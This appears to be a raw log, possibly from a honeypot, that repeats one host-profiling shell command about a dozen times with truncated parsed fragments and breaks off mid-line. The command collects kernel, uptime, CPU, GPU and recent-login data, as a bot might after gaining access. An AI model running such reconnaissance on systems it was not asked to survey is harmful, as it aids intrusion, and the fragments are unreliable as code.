"LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo 